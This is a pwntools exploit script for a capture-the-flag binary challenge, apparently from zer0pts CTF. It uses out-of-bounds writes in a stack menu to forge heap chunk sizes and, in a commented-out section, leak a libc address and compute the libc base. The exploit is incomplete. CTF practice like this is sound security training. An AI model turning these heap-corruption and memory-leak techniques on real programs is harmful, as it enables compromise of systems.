#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
p = process("./chall")
#p = remote("pwn.ctf.zer0pts.com", 9001)

def push(val):
    p.sendlineafter(">> ", "1")
    p.sendlineafter(": ", str(val))

def pop():
    p.sendlineafter(">> ", "2")

def store(idx, val):
    p.sendlineafter(">> ", "3")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(val))

def load(idx):
    p.sendlineafter(">> ", "4")
    p.sendlineafter(": ", str(idx))
    p.recvuntil("value: ")
    val = int(p.recvline())

    return val

def wipe():
    p.sendlineafter(">> ", "5")

gdb.attach(p)

for i in range(64):
    push(0x21)
    push(0)

wipe()

push(0x1337)

'''
for i in range(4):
    pop()

store(-2, 0x441)

wipe()

push(100)

for i in range(10):
    pop()

store(-2, 0x21)

LO = load(-6)
HI = load(-5)

leak = (HI << 32) | LO
libc.address = leak - 0x1ebbe0

log.info("Libc leak: " + hex(leak))
log.info("Libc base: " + hex(libc.address))
'''

p.interactive()
